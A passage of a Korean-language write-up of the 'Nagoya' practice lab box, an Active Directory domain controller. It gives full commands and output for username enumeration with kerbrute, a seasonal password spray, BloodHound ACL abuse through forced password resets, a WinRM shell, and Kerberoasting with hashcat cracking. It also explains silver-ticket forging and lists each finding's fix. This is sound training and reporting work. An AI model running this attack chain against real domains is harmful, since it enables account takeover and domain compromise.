---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/partial
  - tech/enum/dirbust
  - tech/cred/spray
  - tech/cred/crack
  - tech/ad/bloodhound
  - tech/ad/kerberoast
  - tech/ad/acl-abuse
  - tech/ad/ticket-forge
  - tech/exec/winrm
  - tech/pivot/ligolo
  - tech/db/mssql
  - tech/win/seimpersonate
  - tech/win/potato
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.120.21
domain: nagoya-industries.com
ports: [53, 80, 135, 139, 389, 445, 593, 636, 3268, 3269, 3389, 5985, 9389]
services: [domain, globalcatldapssl, http, ldap, ldapssl, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: partial
manual_tags: true
manual_cves: true
manual_status: true
tech_count: 13
---

> [!info] 요약
> **Nagoya** · PG Practice · Advanced · Windows Server 2019 도메인 컨트롤러(`nagoya.nagoya-industries.com`, 192.168.120.21) · 플래그 1개(`proof.txt`) — `local.txt` 미확보(근거는 `Initial Access` 상세 절)
> 진입점: `/Team` 직원 명부 실명 28개 → username-anarchy+kerbrute 계정 열거(405→26) → 사이트 푸터 연도 기반 비밀번호 스프레이 → `craig.carr` 확보 → BloodHound ACL 사슬(EMPLOYEES→HELPDESK) 남용 → `christopher.lewis` WinRM 셸
> 권한상승: `svc_mssql` Kerberoast 크랙 → 도메인 SID + NT해시로 MSSQL 실버티켓 위조 → `xp_cmdshell` → `SeImpersonatePrivilege` → PrintSpoofer → `nagoya$`(DC 컴퓨터 계정)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.120.21

### Initial Access – 웹 직원 명부 기반 계정 스프레이와 ACL 위임 남용으로 도메인 사용자 WinRM 셸 획득

**Vulnerability Explanation:**
- `/Team` 페이지가 직원 실명 28명을 인증 없이 노출. 실명→계정명 규칙 생성(username-anarchy) 후 Kerberos 사전인증 응답 차이(kerbrute)로 실재 계정 26개 확정 — 이 질의는 비밀번호를 보내지 않아 계정 잠금을 유발하지 않음
- 사이트 푸터의 저작권 연도(`© 2023`)가 비밀번호 정책(계절+연도) 추정 근거가 되어 스프레이 후보를 4개로 축소, `craig.carr:Spring2023` / `fiona.clark:Summer2023` 확보
- `EMPLOYEES` 그룹에 `GenericAll`(대상에 `iain.white` 포함), `HELPDESK` 그룹에 **EMPLOYEES 멤버 21명 전원**에 대한 `GenericAll` 이 위임돼 있어 `craig.carr → iain.white → christopher.lewis` 2홉 비밀번호 재설정 사슬이 성립. `christopher.lewis` 는 `Remote Management Users` 의 유일 멤버인 `DEVELOPERS` 소속이라 WinRM 로그인 가능

**Vulnerability Fix:**
- 직원 실명을 인증 없는 페이지에 노출하지 않거나 계정명 생성 규칙과 다르게 구성
- 계절+연도 등 예측 가능한 패턴을 비밀번호 정책에서 차단(유출 비밀번호 대조·금지어 사전 적용)
- 사용자 객체에 대한 `GenericAll` 을 광역 그룹에 위임하지 말 것 — 위임은 OU 단위로 좁히고 `ForceChangePassword` 만 부여

**Severity:** High — 인증 없는 정보 노출 + 예측 가능한 비밀번호 + ACL 오설정 체인으로 도메인 사용자 대화형 셸 획득(아직 관리자 권한 아님)

**Steps to reproduce the attack:**
1. `/Team` 에서 직원 실명 28개 수집
2. username-anarchy 로 계정명 후보 405개 생성 → kerbrute 로 26개 확정
3. 사이트 푸터 연도 기반 비밀번호 후보 4개(`Spring/Summer/Fall/Winter2023`)로 26계정 스프레이 → `craig.carr:Spring2023`, `fiona.clark:Summer2023` 확보
4. BloodHound 수집 → `craig.carr`(EMPLOYEES)가 `GenericAll` 로 `iain.white`(HELPDESK) 도달, `iain.white` 가 `GenericAll` 로 `christopher.lewis`(DEVELOPERS) 도달
5. `net rpc password` 로 두 계정 비밀번호를 순차 재설정 → `christopher.lewis` 로 WinRM 로그인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.120.21 | TCP: 53, 80, 135, 139, 389, 445, 593, 636, 3268, 3269, 3389, 5985, 9389, 49666, 49668, 49676, 49678, 49679, 49693, 49708, 49805 |

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Mon Jul  6 13:08:07 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.21
Nmap scan report for 192.168.120.21
Host is up (0.066s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Nagoya Industries - Nagoya
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2026-07-05T03:36:25
|_Not valid after:  2027-01-04T03:36:25
|_ssl-date: 2026-07-06T04:10:15+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-06T04:09:35+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc             Microsoft Windows RPC
49679/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
49708/tcp open  msrpc             Microsoft Windows RPC
49805/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-06T04:09:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   65.57 ms 192.168.45.1
2   65.50 ms 192.168.45.254
3   65.99 ms 192.168.251.1
4   66.08 ms 192.168.120.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  6 13:10:18 2026 -- 1 IP address (1 host up) scanned in 131.32 seconds
```
— 출처: `~/PG/Nagoya/nmap.log`

`-Pn` 으로 호스트 발견을 건너뜀 — PG 타겟은 대체로 ICMP 를 드롭함. 다만 이 박스가 실제로 ICMP 를 받는지는 따로 확인한 기록이 없음(관측 없음). `--min-rate 5000` 없이 `-p-` 를 돌리면 filtered 포트 65514개에서 재전송 타임아웃을 다 기다림.

버전·역할 판정 근거:
- **53 + 389 + 445 + 3268 + 9389 = 도메인 컨트롤러 확정.** 9389(ADWS)와 3268(글로벌 카탈로그)은 DC 에만 뜸
- `rdp-ntlm-info` 가 **인증 없이** 도메인명·NetBIOS 명·FQDN·빌드(`10.0.17763` = Server 2019)를 전부 노출 — 자격증명 0개 상태에서 가장 밀도 높은 정보
- **`Not shown: 65514 filtered`** — closed 가 아니라 filtered. 호스트 방화벽이 드롭 중이라는 신호이고, 실제로 MSSQL(1433)이 여기 숨어 있었음(`Privilege Escalation` 절 참조)
- `smb2-security-mode: signing enabled and required` — DC 기본값. SMB 릴레이 경로는 여기서 배제

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ whatweb http://192.168.120.21
http://192.168.120.21 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@nagoya-industries.com,info@nagoyaindustries.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.120.21], JQuery, Microsoft-IIS[10.0], Script, Title[Nagoya Industries - Nagoya]
```
— 출처: `~/PG/Nagoya/whatweb.log`

![[Pasted image 20260706145621.png]]

whatweb 은 IIS 10.0 까지만 알려줌. 프레임워크 판정은 feroxbuster 결과에서 나온 독립 근거 둘 — `/Nagoya.styles.css`(ASP.NET Core CSS isolation 산출물, `<어셈블리명>.styles.css`)와 `/index`·`/team`·`/error` 가 확장자 없이 200 을 주는 것(MVC 라우팅). 둘이 같은 결론을 가리켜 "IIS 위의 ASP.NET Core 앱"으로 확정.

feroxbuster 로 나온 것 전부(상태 200):

```text
/                          3530
/index                     3530
/team                      6896
/Team                      6896
/error                     3128
/Nagoya.styles.css         1123
/css/site.css /js/site.js /ship.jpg
/lib/bootstrap/... /lib/jquery/...
```

정적 자산과 페이지 3개가 전부. 웹에서 별도 취약점은 찾지 못했고, 이 박스에서 웹의 역할은 데이터 제공(직원 명부) 하나.

`/Team` 이 직원 명부를 표로 뿌림.

![[Pasted image 20260706141343.png]]

```bash
curl -s http://192.168.120.21/Team | grep -oP '(?<=<td>)[A-Za-z]+' | paste - -
```

같은 출력을 `names.txt` 로 받음(28행):

```text
Matthew	Harrison
Emma	Miah
Rebecca	Bell
...
Joanne	Lewis
```

푸터: **`© 2023 - Nagoya`**. 이 연도가 이후 비밀번호 스프레이 후보의 근거가 됨.

### Initial Access – 계정 스프레이 + ACL 사슬로 WinRM 셸

웹 정찰로 스프레이 재료를 만드는 일반 절차와 서비스 계정 로그인 실패의 재해석은 [[_PLAYBOOK]] 참조. 이 절은 이 박스의 실제 재현.

실명 28명 → 계정명 후보 생성. `username-anarchy` 가 이름 하나에서 `matthew`·`m.harrison`·`mharrison`·`harrison.m` 등으로 전개:

```bash
┌──(kali㉿kali)-[~/git/username-anarchy]
└─$ ./username-anarchy -i /home/kali/PG/Nagoya/names.txt > users.txt
┌──(kali㉿kali)-[~/git/username-anarchy]
└─$ mv users.txt ~/PG/Nagoya
```

28명 × 14~15가지 = **405개 후보**. 존재 여부는 AS-REQ 사전인증 응답의 에러 코드로 판정 — 없으면 `KDC_ERR_C_PRINCIPAL_UNKNOWN`, 있으면 `KDC_ERR_PREAUTH_REQUIRED`. kerbrute 는 이 차이만 보고 비밀번호를 보내지 않아 계정 잠금을 유발하지 않음.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ /home/kali/git/kerbrute/kerbrute_linux_amd64 userenum -d nagoya-industries.com --dc 192.168.120.21 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/06/26 - Ronnie Flathers @ropnop

2026/07/06 14:36:30 >  Using KDC(s):
2026/07/06 14:36:30 >   192.168.120.21:88

2026/07/06 14:37:51 >  [+] VALID USERNAME:       rebecca.bell@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       scott.gardner@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       terry.edwards@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       holly.matthews@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       anne.jenkins@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       brett.naylor@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       melissa.mitchell@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       craig.carr@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       fiona.clark@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       patrick.martin@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       kate.watson@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       kirsty.norris@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       andrea.hayes@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       abigail.hughes@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       melanie.watson@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       frances.ward@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       sylvia.king@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       wayne.hartley@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       iain.white@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       joanna.wood@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       bethan.webster@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       elaine.brady@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       christopher.lewis@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       megan.johnson@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       damien.chapman@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       joanne.lewis@nagoya-industries.com
2026/07/06 14:38:49 >  Done! Tested 405 usernames (26 valid) in 139.416 seconds
```

![[Pasted image 20260706144017.png]]

**26개가 전부 `이름.성` 형식.** 다른 규칙은 걸리지 않아 계정 규칙을 확정. 유효한 것만 `valid_users.txt` 로 손으로 추림(28명 중 `matthew.harrison`·`emma.miah` 는 kerbrute 목록에 없어 26개).

⚠️ **그 둘은 실재하는 활성 계정이었음 — kerbrute 의 거짓 음성.** 뒤에 수집한 BloodHound JSON 에 `MATTHEW.HARRISON`·`EMMA.MIAH` 가 `enabled: true` 인 EMPLOYEES 멤버로 들어 있음(출처: `~/PG/Nagoya/20260706153247_users.json`). 이 박스에서는 두 계정이 스프레이 대상에서 빠져도 결과가 같았지만, **열거 도구의 「없음」을 부재 근거로 쓰면 안 된다**는 사례임. 왜 응답이 갈렸는지는 이 박스에서 확인하지 않음(관측 없음).

**수동 대안** — username-anarchy 없이 손으로 규칙 5개(`first.last`·`flast`·`f.last`·`firstl`·`last`)만 전개해도 이 박스는 뚫림(정답이 `이름.성`). kerbrute 없이는 `impacket-GetNPUsers <도메인>/<계정> -no-pass` 를 계정마다 돌려 같은 에러 코드 차이를 읽으면 됨 — 느릴 뿐 판정 근거는 동일.

AS-REP 로스팅부터 시도했으나 전멸(공짜 시도라 손해는 시간 5분뿐):

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-GetNPUsers nagoya-industries.com/ -usersfile valid_users.txt -no-pass -dc-ip 192.168.120.21 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User rebecca.bell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User scott.gardner doesn't have UF_DONT_REQUIRE_PREAUTH set
...
[-] User joanne.lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
```
— 출처: 원본 손기록. 26줄이 전부 같은 메시지였고 `~/PG/Nagoya/` 에 이 실행의 출력 파일은 남지 않음.

남는 건 스프레이. rockyou 를 26계정에 뿌리면 잠금 정책에 걸릴 위험이 있어, 웹 푸터의 `© 2023` 을 근거로 후보를 계절+연도 4개로 좁힘:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ cat season_pass.txt
Spring2023
Summer2023
Fall2023
Winter2023
```

26계정 × 4비번 = 104회지만 **계정당 4회**라 잠금 임계값(보통 5~10) 아래. 정확한 정책은 자격증명 확보 뒤 `nxc smb <DC> -u … -p … --pass-pol` 로 읽을 수 있으나 이 박스에서는 읽어보지 않음(관측 없음).

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ nxc smb 192.168.120.21 -u valid_users.txt -p season_pass.txt --continue-on-success
SMB         192.168.120.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\rebecca.bell:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\scott.gardner:Spring2023 STATUS_LOGON_FAILURE
…(중략)…
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023
…(중략)…
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\fiona.clark:Summer2023
…(중략, Fall2023·Winter2023 전부 STATUS_LOGON_FAILURE)…
```
— 출처: 원본 손기록(`…(중략)…` 는 원문 표기). nxc 출력 파일은 미보존이고, 명령 자체는 `~/.zsh_history` 에 남아 있음. `craig.carr:Spring2023` 은 이후 명령 6건에서 실제로 쓰여 독립 확인됨.

`--continue-on-success` 가 없으면 첫 성공에서 멈춰 `fiona.clark:Summer2023` 을 놓쳤을 것. `-u`/`-p` 에 파일 경로를 주면 nxc 가 전체 조합(26×4)을 비밀번호를 바깥 루프로 돌림 — 한 계정을 연속으로 때리지 않아 잠금 정책 관점에서 옳은 순서.

**수동 대안** — nxc 없이는 `for p in $(cat season_pass.txt); do for u in $(cat valid_users.txt); do smbclient -L //192.168.120.21 -U "$u%$p"; done; done` 형태로 같은 순서(비밀번호 바깥 루프)를 손으로 재현할 수 있음. 이 박스에서 실행한 형태는 아님.

`craig.carr:Spring2023` 으로 BloodHound 수집:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ bloodhound-python -d nagoya-industries.com -u 'craig.carr' -p 'Spring2023' -ns 192.168.120.21 -c all --dns-timeout 30
```

![[Pasted image 20260706154413.png]]

![[Pasted image 20260706154341.png]]

수집 JSON(`~/PG/Nagoya/20260706153247_*.json`)에서 뽑은 실제 경로:

| 홉 | 주체 | 권한 | 대상 | 근거 |
|---|---|---|---|---|
| 1 | `craig.carr` ∈ **EMPLOYEES** | GenericAll | `iain.white` | EMPLOYEES 가 iain.white·joanna.wood·bethan.webster·svc_helpdesk 에 GenericAll |
| 2 | `iain.white` ∈ **HELPDESK** | GenericAll | `christopher.lewis` | HELPDESK 가 **EMPLOYEES 멤버 21명 전원**에 GenericAll |
| 3 | `christopher.lewis` ∈ **DEVELOPERS** | — | WinRM 로그인 | DEVELOPERS 가 **Remote Management Users** 의 유일한 멤버 |

HELPDESK 의 GenericAll 대상 21명은 EMPLOYEES 의 멤버 21명과 정확히 같은 집합(위 154341 스크린샷의 부채꼴, `20260706153247_users.json` 의 ACE 카운트도 21) — "HELPDESK 가 일반 직원 전원을 관리한다"는 위임을 그대로 옮긴 설정.

2홉이 필요한 이유 — `craig.carr` 는 EMPLOYEES 소속이라 `iain.white` 는 건드릴 수 있지만 `christopher.lewis` 는 못 건드림. `christopher.lewis` 를 통제하는 건 HELPDESK 인데 `craig.carr` 는 HELPDESK 가 아니고, `iain.white` 가 HELPDESK 멤버라 경유지로 씀. `christopher.lewis` 를 표적으로 삼은 이유 — Remote Management Users 의 멤버가 DEVELOPERS 그룹 하나이고, EMPLOYEES/HELPDESK 가 손댈 수 있는 계정 중 DEVELOPERS 소속은 `christopher.lewis` 뿐. 나머지 DEVELOPERS 멤버 joanne.lewis·damien.chapman·megan.johnson·elaine.brady 의 ACE 목록에는 Domain Admins·Enterprise Admins·Administrators·Account Operators 같은 도메인 특권 그룹만 있고 **EMPLOYEES/HELPDESK 는 없음**(출처: `20260706153247_users.json`). 셸이 되는 계정은 하나였음.

**수동 대안** — BloodHound 없이는 `impacket-lookupsid` 로 계정을 열거하고 `ldapsearch -x -H ldap://192.168.120.21 -D 'craig.carr@nagoya-industries.com' -w Spring2023 -b 'DC=nagoya-industries,DC=com' '(objectClass=user)' memberOf` 로 그룹을 확인하면 같은 결론에 닿음. 다만 ACE 는 `nTSecurityDescriptor` 를 손으로 파싱해야 해서 느림.

**시험 규정** — 이 박스에서 쓴 도구 중 OSCP 금지 대상은 **없음**. BloodHound·bloodhound-python·kerbrute·username-anarchy·nxc(NetExec)·impacket·hashcat·ligolo-ng·PrintSpoofer 는 전부 열거 전용이거나 단일 기법 도구라 허용됨. Metasploit 은 이 박스에서 쓰지 않음.

> [!tip] GenericAll on user = 비밀번호 재설정
> 사용자 객체에 대한 GenericAll/ForceChangePassword 는 기존 비밀번호를 몰라도 새 비밀번호를 박을 수 있다는 뜻. 원본 비밀번호는 복구 불가하므로 보고서에 "변경했다"를 반드시 남길 것.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ net rpc password "iain.white" 'Password123!' -U "nagoya-industries.com/craig.carr%Spring2023" -S 192.168.120.21

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ net rpc password 'christopher.lewis' 'Password123!' -U 'nagoya-industries.com/iain.white%Password123!' -S 192.168.120.21

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ evil-winrm -i 192.168.120.21 -u christopher.lewis -p 'Password123!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> whoami
nagoya-ind\christopher.lewis
```

`net rpc password <대상> <새비번> -U <도메인>/<주체>%<주체비번> -S <DC>` 가 SAMR 로 비밀번호를 바꿈. 성공하면 아무것도 출력하지 않음(조용한 게 정상). `Password123!` 의 `!` 는 zsh 히스토리 확장 문자라 반드시 작은따옴표로 감쌀 것 — 시행착오는 [[_PLAYBOOK]] 참조.

**Local.txt value:** 없음.

`~/PG/Nagoya/` 산출물, `~/.zsh_history`, 이 박스 구간 스크린샷 24장을 전부 확인했으나 `local.txt` 를 읽은 흔적이 없다. `christopher.lewis` 의 WinRM 세션에서 `type C:\Users\Christopher.Lewis\Desktop\local.txt` 한 줄이면 됐을 것 — 셸은 이미 있었고 놓쳤다. `[가정]` 표준 위치에 있었을 것으로 보이나 확인하지 않았다. 이 박스의 판정은 프론트매터대로 `partial`(1/2).

### Privilege Escalation – Kerberoast 자격증명 크랙과 실버티켓 위조로 MSSQL sysadmin 획득

**Vulnerability Explanation:**
- `svc_mssql` 서비스 계정의 SPN 티켓(TGS)이 RC4-HMAC(etype 23)로 암호화돼 있어 그 계정의 NT해시 그대로 오프라인 크랙 가능(Kerberoasting). `Service1` 이 rockyou 사전에 있어 9초에 크랙됨
- 크랙된 비밀번호로는 어떤 대화형 서비스에도 로그인이 안 되지만(정상 — 서비스 계정), 그 평문을 UTF-16LE MD4 해시로 변환해 `impacket-ticketer` 로 **실버티켓**을 위조 가능. 서비스 티켓은 서비스 계정 키로만 검증되므로 그 키(NT해시)를 알면 KDC 를 거치지 않고 임의 사용자(RID 500=Administrator)로 위조된 PAC 을 담은 티켓을 직접 발급 가능
- MSSQL(1433)이 호스트 방화벽에 막혀 외부에서 안 보였으나(`Not shown: 65514 filtered`), 내부 서비스라 셸을 발판 삼은 터널로 접근 가능

**Vulnerability Fix:**
- SPN 계정을 gMSA 로 전환(자동 생성 120자 비밀번호는 크랙 불가), 불가하면 최소 25자 랜덤 + AES 전용(`msDS-SupportedEncryptionTypes` 에서 RC4 제거) — RC4 를 끄면 etype 23 티켓 자체가 안 나옴
- PAC full signature 강제(KB5020805/CVE-2022-37967, `KrbtgtFullPacSignature`) — 서명이 krbtgt 키로 만들어져 서비스 계정 해시만으로는 위조 불가. 2023-07 부터 enforcement 기본값
- `xp_cmdshell` 비활성화, SQL Server 서비스 계정에서 불필요 특권 제거, sysadmin 목록에서 도메인 광역 그룹 제거

**Severity:** Critical — 위조 티켓으로 MSSQL sysadmin 획득 후 `xp_cmdshell` 로 임의 명령 실행

**Steps to reproduce the attack:**
1. `impacket-GetUserSPNs`(도메인 자격증명 하나만 있으면 됨) 로 SPN 계정 TGS 요청, etype 23 확인
2. hashcat `-m 13100` + rockyou 로 `svc_mssql:Service1` 크랙(9초)
3. 도메인 SID(`impacket-lookupsid`) + NT해시(MD4 of UTF-16LE 평문) 산출
4. 1433 이 외부에서 안 보이므로 ligolo-ng 로 `christopher.lewis` WinRM 셸을 통해 내부 터널 개설
5. `impacket-ticketer` 로 실버티켓(`-spn MSSQL/... -user-id 500 Administrator`) 위조, `KRB5CCNAME` 절대경로 export
6. `impacket-mssqlclient -k`(FQDN 대상) 로 접속 → `xp_cmdshell` 활성화

SPN 계정 열거와 TGS 요청:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-GetUserSPNs nagoya-industries.com/craig.carr:Spring2023 -dc-ip 192.168.120.21 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation
----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 16:31:06.190955  <never>
MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 16:45:33.288595  2024-08-02 10:48:41.441299

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_helpdesk$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_helpdesk*$ff27c107da97f9e7c755bae8cca8f1d0$d21ba6d4194bc28611ef2974bb218ee946a7cca4461838d0a3dd0d5f0ed97ee9…(2389자, 전문은 ~/PG/Nagoya/hash.txt)
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$6f15123e21a1df6ae63fc333287e9043$d952b84710651a54baa879d839c5cce61e18c3c495ecbd93abde51dae0079da…(2383자, 동)
```

`-request` 가 붙어야 TGS 를 실제로 받아온다(빼면 SPN 목록만). `$krb5tgs$23$` 의 `23` = RC4-HMAC(etype 23) — 티켓이 서비스 계정의 **NT해시 그대로**로 암호화됐다는 뜻이라 오프라인 크랙이 성립함(etype 18/AES 면 hashcat 모드가 19700 으로 바뀌고 훨씬 느림).

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
...
Hashes: 2 digests; 2 unique digests, 2 unique salts
...
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$…(중략)…:Service1
Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Mon Jul  6 15:56:03 2026 (9 secs)
Speed.#01........:  1724.0 kH/s (1.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
```

**`svc_mssql : Service1`**. 9초. `svc_helpdesk` 는 rockyou 로 안 깨짐(`Recovered 1/2`, `Status: Exhausted`).

비밀번호를 알아도 svc_mssql 로는 어떤 대화형 서비스에도 로그인이 안 됨(정상 — 서비스 계정, 시행착오는 [[_PLAYBOOK]]). 그 값을 로그인이 아니라 암호 재료로 전환:

> [!note] 실버티켓이 성립하는 이유
> Kerberos 의 서비스 티켓(TGS)은 서비스 계정의 키로 암호화되고, 서비스는 그 키로 복호화해 안에 든 PAC(사용자 신원과 그룹 SID)을 그대로 믿는다. 그 키(NT해시)를 알면 KDC 를 거치지 않고 "나는 Administrator(RID 500)이고 Domain Admins 소속이다"라고 적힌 티켓을 직접 만들어 넣을 수 있다.
> 제약 둘 — (1) 그 서비스 하나에만 통함(TGT 가 아니라서 다른 서비스로는 못 감). (2) PAC 서명을 검증당하면 막힘. 서버 체크섬은 서비스 키로 만들 수 있어 문제없지만, KB5020805(CVE-2022-37967)가 추가한 krbtgt 키 서명 **full PAC signature** 는 위조 불가. 이 타깃은 빌드 `10.0.17763.4252`(2023-04 누적)이고 그 서명의 강제 적용 기본값은 2023-07 부터라 여기서는 안 걸림.
> 골든티켓은 같은 원리를 krbtgt 해시에 적용한 것이라 도메인 전체에 통함.

실버티켓 재료 넷과 조달처:

| 재료 | 값 | 어디서 |
|---|---|---|
| 서비스 계정 NT해시 | `e3a0168bc21cfb88b95c954a5b18f57c` | 평문 `Service1` → MD4(UTF-16LE) |
| 도메인 SID | `S-1-5-21-1969309164-1513403977-1686805993` | `impacket-lookupsid` 또는 WinRM `WindowsIdentity` |
| SPN | `MSSQL/nagoya.nagoya-industries.com` | GetUserSPNs 출력 |
| 사칭할 RID | `500`(Administrator) | 고정 |

```powershell
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> [System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid.Value
S-1-5-21-1969309164-1513403977-1686805993
```

![[Pasted image 20260707103653.png]]

칼리에서 자격증명만으로도 같은 값을 얻음:

```bash
